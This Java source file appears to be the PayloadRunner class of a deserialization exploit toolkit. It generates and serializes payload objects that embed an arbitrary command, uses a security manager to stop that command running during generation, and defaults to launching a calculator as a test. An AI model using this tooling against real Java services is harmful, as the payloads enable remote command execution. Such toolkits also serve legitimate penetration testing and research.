package util;

import common.Serializer;
import common.secmgr.ExecCheckingSecurityManager;
import payloads.ObjectPayload;
import payloads.ObjectPayload.Utils;

import java.util.concurrent.Callable;

/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings("unused")
public class PayloadRunner {

    public static byte[] run(final Class<? extends ObjectPayload<?>> clazz, final String command) throws Exception {
		// ensure payload generation doesn't throw an exception

		return new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>() {
			public byte[] call() throws Exception {
//				System.out.println("generating payload object(s) for command: '" + command + "'");

				ObjectPayload<?> payload = clazz.newInstance();
				final Object objBefore = payload.getObject(command);

//				System.out.println("serializing payload");
				byte[] ser = Serializer.serialize(objBefore);
				Utils.releasePayload(payload, objBefore);
				return ser;
			}
		});
	}


    private static String getDefaultTestCmd() {
	    return getFirstExistingFile(
	        "C:\\Windows\\System32\\calc.exe",
            "/Applications/Calculator.app/Contents/MacOS/Calculator",
            "/usr/bin/gnome-calculator",
            "/usr/bin/kcalc"
        );
    }

    private static String getFirstExistingFile(String ... files) {
        return "calc.exe";
//        for (String path : files) {
//            if (new File(path).exists()) {
//                return path;
//            }
//        }
//        throw new UnsupportedOperationException("no known test executable");
    }
}
